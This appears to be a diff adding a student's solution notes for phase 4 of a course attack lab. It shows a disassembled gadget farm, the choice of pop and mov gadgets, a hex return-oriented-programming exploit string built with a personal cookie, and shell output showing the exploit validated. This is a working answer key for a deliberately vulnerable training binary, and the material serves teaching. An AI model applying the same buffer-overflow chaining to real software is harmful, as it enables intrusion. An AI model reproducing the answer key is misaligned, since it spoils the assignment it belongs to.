@@ -1,0 +1,84 @@
+000000000040184e <start_farm>:
+  40184e:	b8 01 00 00 00       	mov    $0x1,%eax
+  401853:	c3                   	retq   
+
+0000000000401854 <addval_233>:
+  401854:	8d 87 43 d8 c3 be    	lea    -0x413c27bd(%rdi),%eax
+  40185a:	c3                   	retq   
+
+000000000040185b <addval_465>:
+  40185b:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  401861:	c3                   	retq   
+
+0000000000401862 <addval_161>:
+  401862:	8d 87 58 90 c7 8e    	lea    -0x71386fa8(%rdi),%eax
+  401868:	c3                   	retq   
+
+0000000000401869 <addval_482>:
+  401869:	8d 87 3f 48 81 c7    	lea    -0x387eb7c1(%rdi),%eax
+  40186f:	c3                   	retq   
+
+0000000000401870 <getval_109>:
+  401870:	b8 58 90 90 c3       	mov    $0xc3909058,%eax
+  401875:	c3                   	retq   
+
+0000000000401876 <getval_331>:
+  401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+  40187b:	c3                   	retq   
+
+000000000040187c <addval_435>:
+  40187c:	8d 87 48 a9 c7 90    	lea    -0x6f3856b8(%rdi),%eax
+  401882:	c3                   	retq   
+
+0000000000401883 <getval_422>:
+  401883:	b8 57 58 90 90       	mov    $0x90905857,%eax
+  401888:	c3                   	retq   
+
+0000000000401889 <mid_farm>:
+  401889:	b8 01 00 00 00       	mov    $0x1,%eax
+  40188e:	c3                   	retq   
+  
+  
+
+no popq %rdi found,  
+found popq %rax(58, then 2 nops then ret) gadget:
+  401870:	b8 58 90 90 c3       	mov    $0xc3909058,%eax
+  
+we need 401870+1=401871
+  
+  
+movq %rax %rdi(48 89 c7):
+  401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+  
+we need 401876+1=401877
+
+my cookie: 0x4f3ff3d1
+  
+the format is padding for the buffer size, gadget 1 address, your cookie, gadget 2 address, return address and finally touch2 address:
+
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+71 18 40 00 00 00 00 00 /* address of gadget 1: popq %rax in little endian */
+d1 f3 3f 4f 00 00 00 00 /* my cookie */
+77 18 40 00 00 00 00 00 /* address of gadget 2: move %rax to %rdi in little endian */
+f1 16 40 00 00 00 00 00 /* address of touch2 function in little endian */
+
+
+u2 israele4 49 : cd SP2/target8888
+u2 israele4 50 : ./hex2raw < phase4sol.txt > phase4raw.txt
+u2 israele4 55 : ./rtarget < phase4raw.txt
+Cookie: 0x4f3ff3d1
+Type string:Touch2!: You called touch2(0x4f3ff3d1)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+  
+
+
+  
